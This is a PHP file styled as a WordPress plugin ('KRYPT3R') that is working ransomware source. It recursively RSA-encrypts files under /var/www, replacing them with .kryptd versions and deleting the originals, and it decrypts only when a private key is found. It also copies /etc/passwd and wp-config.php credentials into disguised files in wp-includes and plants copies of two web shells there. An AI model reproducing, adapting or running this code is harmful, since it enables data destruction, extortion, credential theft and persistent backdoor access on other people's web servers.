<?php

/**
 * Plugin Name: KRYPT3R - WP Plugin
 * Plugin URI: 
 * Description: It does things to your files you don't want it to
 * Version: 8.67-5309
 * Author: jrob5877 (0xdecae)
 * Author URI:
 * */


// This program mainly just encrypts cosmetic files and things that won't necessarily break the entire function of the site


// Recursively searches for all files with any suffix not listed below, then calls krypt with their path as an argument
function victimize($dir, $key, $csize, $cry)
{
	$files = array_diff(scandir($dir), array('.', '..'));

	foreach($files as $file) 
	{
		$path = $dir."/".$file;
		//echo $path."\n"; 
		if(is_dir($path))
		{
			//echo $path." is dir, further sinking...\n";
			victimize($path, $key, $csize, $cry);	

		}
		else if ($path != __FILE__ 
			and pathinfo($file)['extension'] != "key" 
			and pathinfo($file)['extension'] != "htaccess"
			// and pathinfo($file)['extension'] != "jpeg"
			and pathinfo($file)['extension'] != "kryptd"
			// and pathinfo($file)['extension'] != "png"
			and pathinfo($file)['extension'] != "abc"
			and pathinfo($file)['extension'] != "Index.php"
			and pathinfo($file)['extension'] != "index.php"
			and pathinfo($file)['extension'] != "php"
			and $cry == true
		) 
		{		
			echo $path." is a file, krypting...\n";
			echo krypt($path, $key, $csize);	
		}
		else if (pathinfo($file)['extension'] == "kryptd" and $cry == false)
		{
			echo $path." is an encrypted file, dekrypting...\n";
			echo dkrypt($path, $key, $csize);
		}

	}
}
// Finds specific file or dir from top-level dir
function search($dir, $target, &$var, $isdir=false)
{
	$files = array_diff(scandir($dir), array('.', '..'));
	
	foreach($files as $file) 
	{
		$path = $dir."/".$file;
		//echo $path."\n"; 
		if( is_dir($path) )
		{
			if($file == $target and $isdir == true)
			{	
				$var = $path;
			}
			else
			{
				search($path, $target, $var, $isdir);
			}
		} 
		else if ($file == $target) 
		{
			$var = $path;
		}
	}
}

// Decrypt function that is called if private key is present
function dkrypt($f, $key, $size)
{	
	$ciphertext = file_get_contents($f);
	//echo "Ciphertext for " . $f . ":\n " . $ciphertext . "\n\n";

	$dest = substr($f, 0, -7);
	//echo "Destination file: " . $dest;
	$out = '';

	while($ciphertext)
	{
		$chunk = substr($ciphertext, 0, $size);
		$ciphertext = substr($ciphertext, $size);
		$dkryptd = '';

		if (!openssl_private_decrypt($chunk, $dkryptd, $key))
		{
			return 'Failed to dekrypt data...';
		}
		
		$out .= $dkryptd;
	}
	$out = gzuncompress($out);
	file_put_contents($dest, $out);
	unlink($f);
}

// Encryption function that is called if public key is available but private key isnt
// Uses Pubkey to openssl encrypt chunk by chunk and paste into <file>.kryptd
function krypt($f, $key, $size)
{	
	$data = file_get_contents($f);
	//echo "Plaintext for " . $f . " before compression:\n " . $data . "\n\n";
	$plaintext = gzcompress($data);
	//echo "Plaintext for " . $f . " after compression:\n " . $plaintext . "\n\n";

	$dest = $f . '.kryptd';
	//echo "Destination file: " . $dest;
	$out = '';

	while($plaintext)
	{
		$chunk = substr($plaintext, 0, $size);
		$plaintext = substr($plaintext, $size);
		$kryptd = '';

		if (!openssl_public_encrypt($chunk, $kryptd, $key))
		{
			return 'Failed to encrypt data...';
		}
		
		$out .= $kryptd;
	}
	//echo 'Output: ' . $out;
	file_put_contents($dest, $out);
	unlink($f);
	return "Krypt of ".$f." successful!\n";
}

// Helper copy function
function grab($target, $dest)
{
	$data = file_get_contents($target);
	file_put_contents($dest, $data);

}

//--------------------------------------------------------//
//$$$$$$$$$$$$$$$$$$ START EXECUTION $$$$$$$$$$$$$$$$$$$$$//
//--------------------------------------------------------//


error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');


$top = '/var/www';

$tears = true;
$chunksize = 0;

chdir($top);

//---------- Target Paths-----------//

// Key Paths
$pubkeypath = '';
$privkeypath = '';

// file paths
$wpconfigpath = '';
$ospasswd = '/etc/passwd';
$shell1path = '';
$shell2path = '';
$viruspath = '';

// Dir Paths
$wpincludesdir = '';
$wpadmindir = '';

// Search for paths
search($top, 'private.key', $privkeypath);
search($top, 'public.key', $pubkeypath);
search($top, 'wp-config.php', $wpconfigpath);
search($top, 'wp-includes', $wpincludesdir, true);
search($top, 'wp-admin', $wpadmindir, true);
search($top, 'shell1.php', $shell1path);
search($top, 'shell2.php', $shell2path);



//echo "privkeypath= ".$privkeypath;
//echo "pubkeypath= ".$pubkeypath;
//echo "wp-config.php= ".$wpconfigpath;
//echo "wp-includes= ".$wpincludesdir;
//echo "wp-admin= ".$wpadmindir;

grab($ospasswd, $wpincludesdir."/pass.abc");
grab($wpconfigpath, $wpincludesdir."/fig.abc");
grab($shell1path, $wpincludesdir."/seashell1.php");
grab($shell2path, $wpincludesdir."/seashell2.php");

//setkey($pubkeypath, $privkeypath, $key);

if (!$pkey = openssl_pkey_get_private('file://'.$privkeypath))
{
	if(!$pkey = openssl_pkey_get_public('file://'.$pubkeypath))
	{
		die("Failed to locate key. Exiting...");
	}
	$a_key = openssl_pkey_get_details($pkey);
	$chunksize = ceil($a_key['bits'] / 8) - 11;
}
else
{
	$tears = false;
	$a_key = openssl_pkey_get_details($pkey);
	$chunksize = ceil($a_key['bits'] / 8);
}

// Do the thing
victimize($top, $pkey, $chunksize, $tears);

// Free the key when we're done
openssl_free_key($pkey);
?>

